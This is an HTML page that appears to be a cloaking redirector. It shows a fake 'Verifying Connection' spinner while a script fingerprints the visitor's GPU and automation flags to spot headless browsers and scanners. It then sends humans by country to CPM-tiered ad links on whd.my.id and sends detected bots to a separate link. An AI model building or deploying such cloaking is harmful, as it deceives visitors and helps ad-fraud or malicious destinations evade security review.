<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        /* Neo-Brutalist Minimalist Style */
        body {
            background-color: #0a0a0a;
            color: #ffffff;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            font-family: 'Inter', system-ui, -apple-system, sans-serif;
        }
        .container {
            border: 4px solid #ffffff;
            padding: 2rem;
            box-shadow: 10px 10px 0px #3b82f6; /* Hard blue shadow */
            max-width: 300px;
            text-align: center;
        }
        .loader {
            width: 40px;
            height: 40px;
            border: 4px solid #ffffff;
            border-top: 4px solid #3b82f6;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin: 0 auto 1rem;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        h1 { font-size: 1.2rem; text-transform: uppercase; letter-spacing: 2px; }
    </style>
</head>
<body>

    <div class="container">
        <div class="loader"></div>
        <h1>Verifying Connection</h1>
    </div>

    <script>
        (async function() {
            /**
             * 1. CONFIGURATION
             * Set your 5 Direct Link Tiers here
             */
            const links = {
                tier1: "https:/tier1.whd.my.id/", // High CPM (US, GB, CA, AU, DE)
                tier2: "https:/tier2.whd.my.id/", // Mid CPM (SG, JP, AE, FR)
                tier3: "https:/tier3.whd.my.id/", // SEA/LATAM (ID, TH, PH, VN, BR)
                other: "https:/tier4.whd.my.id/",// Low CPM / Others
                bots:  "https:/tier5.whd.my.id/"  // Junk/Bot filter
            };

            /**
             * 2. ADVANCED HARDWARE FILTERING
             * Detects GPU-less servers and automated environments
             */
            function analyzeHardware() {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                
                if (!gl) return { isBot: true };

                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                if (!debugInfo) return { isBot: false };

                const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL).toLowerCase();
                
                // Specific signatures of Headless/VPS browsers
                const botDrivers = ["swiftshader", "llvmpipe", "virtualbox", "vmware", "mesa offscreen", "microsoft basic render"];
                const isHardwareBot = botDrivers.some(term => renderer.includes(term));
                
                // standard automation flags
                const isAutomation = navigator.webdriver || !navigator.languages || navigator.languages.length === 0;

                return { isBot: isHardwareBot || isAutomation };
            }

            /**
             * 3. NETWORK DETECTION & ROUTING
             */
            try {
                // Fetch Cloudflare Trace & Analyze hardware simultaneously
                const [hardware, traceRes] = await Promise.all([
                    analyzeHardware(),
                    fetch('/cdn-cgi/trace').then(r => r.text())
                ]);

                // Parse Trace (loc=ID, etc.)
                const cfData = Object.fromEntries(
                    traceRes.split('\n').filter(v => v).map(v => v.split('='))
                );

                const country = cfData.loc;

                // --- FINAL LOGIC ---

                // A: The Bot Trap
                if (hardware.isBot) {
                    window.location.replace(links.bots);
                    return;
                }

                // B: The Tiers
                const T1 = ["US", "GB", "CA", "AU", "DE", "CH", "NO"];
                const T2 = ["SG", "JP", "AE", "FR", "NL", "IE", "ES"];
                const T3 = ["ID", "TH", "PH", "VN", "MY", "BR", "MX"];

                if (T1.includes(country)) {
                    window.location.replace(links.tier1);
                } else if (T2.includes(country)) {
                    window.location.replace(links.tier2);
                } else if (T3.includes(country)) {
                    window.location.replace(links.tier3);
                } else {
                    window.location.replace(links.other);
                }

            } catch (e) {
                // Critical Fallback
                window.location.replace(links.other);
            }
        })();
    </script>
</body>
</html>
